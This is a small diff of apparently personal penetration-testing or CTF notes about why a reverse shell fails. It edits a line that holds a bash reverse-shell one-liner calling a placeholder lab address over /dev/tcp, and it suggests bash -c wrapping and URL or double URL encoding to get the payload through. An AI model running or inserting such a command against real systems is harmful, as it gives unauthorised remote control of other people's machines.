@@ -16,7 +16,7 @@ sort : 1
 ```note
 some times the shell doesn't work, why ?? 
 
-> if it is a bash reverse shell, e.g. `bash -i >& /dev/tcp/10.10.x.x/1234 0>&1` try precede it with `bash -c` 
+> if it is a bash reverse shell, e.g. bash -i >& /dev/tcp/10.10.x.x/1234 0>&1 , try precede it with `bash -c` 
 
 > try URL encoding / double URL encoding
 
